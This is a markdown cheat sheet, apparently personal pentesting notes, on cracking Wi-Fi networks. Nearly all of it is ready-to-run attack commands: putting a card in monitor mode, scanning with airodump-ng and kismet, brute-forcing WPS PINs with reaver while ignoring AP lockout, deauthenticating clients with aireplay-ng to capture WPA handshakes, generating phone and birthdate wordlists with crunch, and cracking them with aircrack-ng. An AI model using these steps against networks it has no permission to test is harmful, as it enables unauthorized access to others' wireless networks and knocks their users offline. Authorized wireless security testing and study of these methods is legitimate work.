# Wireless Crack

## Monitor Mode

Depending on the card the command to put card in monitor mode can differ.

```
ifdown wlan0
airmon-ng start wlan0mon
ifup wlan0
```

or 

```
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

## Change channel 

Sometime airodump get stuck on a channel:

```
iwconfig wlan0mon channel <channel>
```

# Scan AP & Client
### Aircrack-ng
```
airodump-ng -c <channel> --bssid <mac_bssid> -w <file> wlan0mon
```

### Kismet

Kismet show a lot of informations about wifi access point:

- Number of client
- Activity
- Security

```
kismet -c wlan0mon
```

Select wifi with many client and traffic in kismet. Better stop Kismet before trying deauth (because kismet automatically switch channel)

## Exploitation

### WPS Flaw with Reaver 

This flaw is only working with old APs. 

Find AP with WPS Activated:

```
wash -i wlan0mon [-c <channel>]
```

Bruteforce WPS Pin - https://lifehacker.com/how-to-crack-a-wi-fi-networks-wpa-password-with-reaver-5873407

```
reaver -i wlan0mon -c <channel> -b <mac_bssid> -vv
reaver -i wlan0mon -c <channel> -b <mac_bssid> -d 60 -N -S -w -vv
reaver -i wlan0mon -c <channel> -b <mac_bssid> -S -N -L -d 1 -r 5:3 -vv
```

```
-d : Delay between pin attemps
-L : Ignore locked state reported by the target AP
-N : Do not send NACK messages when out of order packets are received
-w : Mimic a Windows 7 registrar
```

### Bruteforce - Aircrack or Fern
Deauth client to get WPA Handshake

```
aireplay-ng -0 1 -a <mac_bssid> -c <client_mac> wlan0mon
```

The deauthentication packets are sent directly from your PC to the clients. So you must be physically close enough to the clients for your wireless card transmissions to reach them. To confirm the client received the deauthentication packets, use tcpdump or similar to look for ACK packets back from the client. 

If you did not get an ACK packet back, then the client did not “hear” the deauthentication packet.

Filtre Wireshark: 

```
(wlan.ra == <client_mac>) && (wlan.fc.type_subtype == 0x001d)
```

You now have the WPA Handshake in your <file>

#### Dictionnary generation with crunch

Most of people use their birthdate or telephone number as a password:

- 10 digits for phone numbers:

  ```
  crunch 10 10 -t 01%%%%%%%% -o ~/01XXXXXXXX_phone_number.lst
  ```

- 8 digit for birthdate

  ```
  crunch 8 8 1234567890 -o ~/8_digits_birthdate.lst
  ```

- ​	6 digits for birthdate

  ```
  crunch 6 6 1234567890 -o ~/6_digits_birthdate.lst
  ```

Run the attack:

```
aircrack-ng -w <password_list> -b <mac_bssid> <file>.cap
```

> Fern is more or less the same thing with a guy for lazy